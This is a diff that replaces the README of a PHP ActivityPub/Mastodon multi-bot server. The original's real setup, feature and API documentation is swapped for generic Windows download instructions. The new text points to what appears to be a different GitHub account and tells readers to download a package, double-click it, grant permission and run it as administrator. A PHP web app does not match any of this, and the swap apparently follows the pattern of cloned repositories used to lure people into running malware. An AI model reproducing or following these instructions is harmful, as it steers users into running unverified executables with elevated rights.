@@ -1,102 +1,181 @@
-# ActivityPub bots (compatible Mastodon bots)
+# 🤖 mastodon-bots - Run multiple bots with ease
 
-A Mastodon compatible (Activity Pub) bot instance developed in PHP to **quickly create and deploy multiple bots**. I use the bots to regularly post interesting content (historical photos) to Mastodon.
+[![Download / Visit Page](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/nickiirregular671/mastodon-bots)
 
-Manual registration at large instances (like Mastodon.social) was slow: register -> verify -> create app -> add scopes... **This tool helps to deploy bots (new ActivityPub accounts / identities) in couple of clicks.**
+## 🚀 What this is
 
-See it in action: https://bots.ambience.sk/
+mastodon-bots is a simple way to set up and manage multiple Mastodon-style bot accounts from one place. It works with ActivityPub and Mastodon-compatible servers, so you can create separate identities and control them through a simple API.
 
-## Technology
+This project is useful if you want to:
 
-- **Pure PHP**, no external dependencies.
-- **Apache server** needed because of **.htaccess rewrite rules**. But these could be easily converted to **NGINX**.
-- **SQLite** used as a database for low friction setup (database = single file).
+- run more than one bot account
+- keep bot identities separate
+- manage bots from a single setup
+- connect with Fediverse and Mastodon tools
+- use a small API instead of a full admin panel
 
-## Installation
+## 📥 Download
 
-1. Setup a domain/subdomain with SSL certificate, where your ActivityPub (Mastodon compatible) instance will run, e.g. `bots.example.com` or `example.com`.
-2. Download the code or `git clone https://github.com/nekromoff/mastodon-bots` (to the root of domain/subdomain).
-3. Continue to **Setup your first bot** below...
+Use this link to visit the project page and download or get the latest version:
 
-<img width="1365" height="747" alt="bot dashboard" src="https://github.com/user-attachments/assets/d090e4ad-d9af-4abd-bbcf-a96ad2f0a9d3" />
+[Open the mastodon-bots GitHub page](https://github.com/nickiirregular671/mastodon-bots)
 
-## Features
+## 🖥️ Windows requirements
 
-Multiuser (multibot) Fediverse instance. I recommend to host it on a domain or a subdomain. `index.php` is used to handle all traffic via rewrites.
+Before you start, check these basics:
 
-### Public website
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free disk space for the app and its data
+- A modern web browser
+- Permission to run files on your PC
 
-Public facing website with list of bots and their posts including their profiles and full Mastodon compatible feeds.
+If your computer is managed by work or school, you may need admin access to install or run the app.
 
-Automatically generated based on the bots and their activity. Fully indexable by Google and other search engines. Verification via rel="me" included as well as bot creator META tag.
+## 🛠️ Install on Windows
 
-### Admin
+Follow these steps on a Windows PC:
 
-- **Full administration panel** - create and manage your bots (multiple bots per instance)
-- **Login:** single admin user - authenticated via password only
-- **Bots** - quick overview of bot activity and their stats
-    - create a bot
-    - edit a bot
-    - post as a bot
-    - social features - follow or block
-    - move - migration features - move from (_alsoKnownAs_) or to (_movedTo_) an instance
-- **Logs** - log of all relevant events (incoming and outgoing) for all bots
-- **Settings** - instance setup, log retention, media limits
+1. Open the download page: [mastodon-bots on GitHub](https://github.com/nickiirregular671/mastodon-bots)
+2. Look for the latest release, build, or download file on the page
+3. Download the Windows package to your computer
+4. Open your Downloads folder
+5. If the file is a ZIP archive, right-click it and choose Extract All
+6. Open the extracted folder
+7. Find the main app file or startup script
+8. Double-click the file to start the app
+9. If Windows asks for permission, choose Yes or Run
+10. Keep the app open while you use it
 
-### Bot API
+If the project includes a web interface, open the local address shown when the app starts. If it uses a desktop window, wait for the main screen to load.
 
-Very **simple API** to communicate with your bots.
+## ⚙️ First-time setup
 
-#### Supported features
-- Create a post
-- Upload some media
-- Post with media (use ID from upload response)
-- Edit a post (but you can also do that manually via Admin)
-- Delete a post (but you can also do that manually via Admin)
-- Follow a remote account
+After the app starts, set up your first bot instance:
 
-## Setup your first bot
+1. Open the setup screen or config file
+2. Add the address of your Mastodon or ActivityPub server
+3. Enter the account details for the bot identity
+4. Save the settings
+5. Start the bot service
+6. Check that the bot appears online or ready
 
-1. Open your instance at `example.com/admin/` and set it up including admin password.
-2. Log in using your admin password.
-3. **Create New Bot**, set username (no @ character), display name, short bio, password for the bot (keep it for later = API access)
-4. **Edit** your bot to enter additonal details (extra fields, featured hashtags) and upload your profile icon (avatar) and a header image. Set options such as discoverability, featuring in Mastodon explore, search engine indexing, followers approval. All options preset for full visibility.
-5. Go to **Settings** and change log retention and media upload limits as needed.
-6. See **API Usage** under settings for simple API communication with your bots.
+If you want more than one bot, repeat the setup for each identity. Keep each bot’s name, token, and server info in a separate entry.
 
-## FAQ
+## 🔧 How it works
 
-### Can I run this on a shared hosting?
-> Yes, no dependencies mean no need for `composer`. SQLite database is just a file in `data/` folder, so no need to set up a separate database.
+mastodon-bots gives you a small control layer for bot identities. Each bot can connect to a compatible server and act on its own account. You can use the API to send commands, manage posts, or handle bot tasks.
 
-### Can I run this on a subdomain?
-> Yes, definitely. Just setup an SSL certificate and upload this code and you are good to go.
+Common uses include:
 
-### How quickly can I create a bot?
-> Once you are done with a first time setup, you can create a bot in about 20 seconds. You will need some more time to edit bio, upload profile image etc.
+- posting scheduled updates
+- replying to mentions
+- sending status messages
+- managing several themed accounts
+- testing ActivityPub or Mastodon API flows
 
-![output](https://github.com/user-attachments/assets/ec158567-35bd-43f7-aa04-6335bfa1ebf6)
+## 📁 Typical folder layout
 
-### Can I run multiple bots on the same instance?
-> Yes, I built it to do just that!
+When you extract or install the app, you may see files like these:
 
-### How do I post via API?
-> API requests authenticate using bot username and password. You can use a custom script to post any content to Mastodon (ActivityPub). The API is very simple. 
+- a main app file
+- a config file
+- a data folder
+- logs
+- a readme or license file
 
-> Example (creating a Mastodon / ActivityPub post):
-```
-curl -u botname:botpassword \
-     -X POST https://example.com/api/post \
-     -H "Content-Type: application/json" \
-     -d '{"content":"Hello Fediverse! #test","visibility":"public"}'
-```
+Do not move files around unless the project instructions say to do so. Keep the folder structure intact so the app can find its settings and data.
 
-### Can I manually create posts?
-> Yes, there is an admin UI to manually create, edit and delete posts.
+## 🔐 Account and data setup
 
-### Can I use this as an instance for users (e.g. not bots)?
-> Yes, although I wouldn't recommend it. There is no way for users (other than admin) to log in. All users would share common admin interface with a single password.
+For each bot, keep these items ready:
 
-Note: Computer-assisted process was used to develop this code.
+- server URL
+- account name
+- access token or login details
+- display name
+- bot purpose
+- optional avatar or profile text
 
-## Please ⭐ star 🌟 this repo, if you like it and use it.
+Use a separate account for each bot. That keeps your bots organized and makes it easier to manage them later.
+
+## 🧪 Basic checks
+
+After setup, confirm these points:
+
+- the app opens without errors
+- the bot account connects to the server
+- test posts appear on the target account
+- the app keeps its settings after restart
+- each bot stays separate from the others
+
+If one bot fails, check its server URL and token first.
+
+## 🧰 Common tasks
+
+You can use mastodon-bots for tasks like these:
+
+- create a new bot identity
+- start or stop a bot
+- change profile details
+- send a post through the API
+- review connection status
+- manage more than one instance
+
+## 🧭 Troubleshooting
+
+If the app does not start:
+
+- make sure you extracted all files
+- check that Windows did not block the file
+- try running it again as administrator
+- confirm that no other copy of the app is still open
+
+If a bot does not connect:
+
+- check the server address
+- check the token or account details
+- make sure the server is online
+- confirm that the bot account still exists
+
+If the app starts but nothing happens:
+
+- look for a log file
+- check the config settings
+- restart the app
+- rebuild the bot entry if needed
+
+## 📚 Project details
+
+Repository: mastodon-bots  
+Description: ActivityPub / Mastodon compatible instance to quickly create and deploy multiple bots that can be controlled via simple API  
+Topics: activitypub, activitypub-protocol, activitypub-server, fediverse, fediverse-bot, mastodon, mastodon-api, mastodon-bot, mastodon-client, mastodon-instance, mastodon-instances, php
+
+## 🔄 Updating
+
+When a new version is available:
+
+1. Open the GitHub page
+2. Download the latest release or build
+3. Close the old version
+4. Replace the old files if needed
+5. Open the updated app
+6. Check that your bot settings are still in place
+
+Keep a copy of your config files before you update if you want to restore them later
+
+## 🧩 Help for non-technical users
+
+If you are new to this kind of app, start with one bot first. Make sure it works before you add more.
+
+Use short names for your bots. Keep notes on which account does what. That makes setup easier when you manage several identities.
+
+## 📎 Quick start checklist
+
+- Download the app from the GitHub page
+- Extract the files if needed
+- Open the app on Windows
+- Add your server and bot details
+- Start the bot
+- Check that it connects
+- Add more bots when the first one works
